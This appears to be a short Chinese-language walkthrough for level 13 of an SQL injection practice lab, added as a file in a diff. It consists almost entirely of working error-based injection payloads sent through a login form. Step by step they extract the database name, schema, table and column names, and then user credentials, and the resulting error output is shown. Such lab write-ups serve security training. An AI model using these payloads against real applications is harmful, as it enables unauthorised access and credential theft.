@@ -1,0 +1,35 @@
+第13关
+
+无回显盲注
+')报错
+
+
+通过float字符串报错注入 获取数据库
+uname=admin') and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) #&passwd=admin&submit=Submit
+Duplicate entry 'security1' for key 'group_key'
+
+爆出库名，通过concat和limit配合
+uname=admin') and (select 1 from (select count(*),concat((select concat(schema_name) from information_schema.schemata limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a) #&passwd=admin&submit=Submit
+Duplicate entry 'mysql1' for key 'group_key'
+
+爆出表名
+uname=admin') and (select 1 from (select count(*),concat((select concat(table_name) from information_schema.tables where table_schema='security' limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a) #&passwd=admin&submit=Submit
+
+爆出列名
+uname=admin') and (select 1 from (select count(*),concat((select concat(column_name) from information_schema.columns where table_name='users' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) #&passwd=admin&submit=Submit
+
+爆出用户名，密码
+uname=admin') and (select 1 from (select count(*),concat((select concat(username,0x3a,password) from users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a) #&passwd=admin&submit=Submit
+Duplicate entry 'Angelina:I-kill-you1' for key 'group_key'
+
+
+闯关成功！！！
+
+
+
+
+
+
+
+
+
